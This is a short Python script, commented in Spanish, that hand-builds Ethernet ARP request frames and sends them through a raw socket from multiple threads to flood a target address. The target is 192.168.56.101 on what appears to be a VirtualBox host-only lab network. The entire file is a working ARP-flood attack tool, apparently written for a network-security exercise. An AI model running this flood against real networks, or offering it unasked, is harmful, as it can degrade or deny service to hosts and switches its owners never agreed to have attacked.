
import socket
import struct
import threading
import sys
import signal
import os

src_mac = bytes.fromhex('08:00:27:8b:52:0b'.replace(':', ''))  # MAC de origen
src_ip = '192.168.56.102'  # IP origen
dst_ip = '192.168.56.101'   # IP destino

# Lista para almacenar los hilos activos
threads_active = []

# Manejador de señal para SIGINT (Ctrl+C)
def signal_handler(sig, frame):
    print("\nInterrupción detectada. Deteniendo todos los hilos...")
    for thread in threads_active:
        # Intentar detener los hilos (si es posible)
        thread.join()
    sys.exit(0)

# Función para crear una solicitud ARP
def create_arp_request(src_mac, src_ip, dst_ip):
    # 1. Cabecera del frame Ethernet (MAC de destino, MAC de origen, tipo Ethernet)
    dst_mac = b'\xff\xff\xff\xff\xff\xff'  # MAC de destino (broadcast)
    eth_type = b'\x08\x06'  # Tipo ARP (0x0806)

    # 2. Paquete ARP (Tipo de hardware, tipo de protocolo, longitud de la dirección de hardware, longitud de la dirección de protocolo, opcode, etc.)
    hw_type = b'\x00\x01'  # Ethernet
    proto_type = b'\x08\x00'  # IPv4
    hw_size = b'\x06'  # Tamaño de la dirección MAC
    proto_size = b'\x04'  # Tamaño de la dirección IP
    opcode = b'\x00\x01'  # Solicitud ARP (1)

    # Dirección MAC de origen
    arp_src_mac = src_mac

    # Dirección IP de origen
    arp_src_ip = socket.inet_aton(src_ip)

    # Dirección IP de destino
    arp_dst_ip = socket.inet_aton(dst_ip)

    # Construir el paquete ARP
    arp_frame = hw_type + proto_type + hw_size + proto_size + opcode + arp_src_mac + arp_src_ip + b'\x00\x00\x00\x00\x00\x00' + arp_dst_ip

    # Crear el frame completo
    packet = dst_mac + src_mac + eth_type + arp_frame
    return packet

# Función para enviar un paquete ARP
def send_arp(src_mac, src_ip, dst_ip):
    # Crear socket RAW
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    sock.bind(('enp0s8', 0))  # Usar la interfaz enp0s8
    # Enviar el paquete ARP
    packet = create_arp_request(src_mac, src_ip, dst_ip)
    sock.send(packet)

# Función para realizar el ARP flood
def flood_arp(src_mac, src_ip, dst_ip, count, threads):
    # Dividir el trabajo entre varios hilos
    def worker():
        for _ in range(count // threads):
            send_arp(src_mac, src_ip, dst_ip)

    # Crear múltiples hilos para enviar ARP flood
    global threads_active  # Referencia global para los hilos activos
    for _ in range(threads):
        thread = threading.Thread(target=worker)
        threads_active.append(thread)  # Agregar el hilo a la lista de hilos activos
        thread.start()

    # Esperar que todos los hilos terminen
    for thread in threads_active:
        thread.join()

# Registrar el manejador de señales para SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":


    flood_arp(src_mac, src_ip, dst_ip, count=100, threads=5)

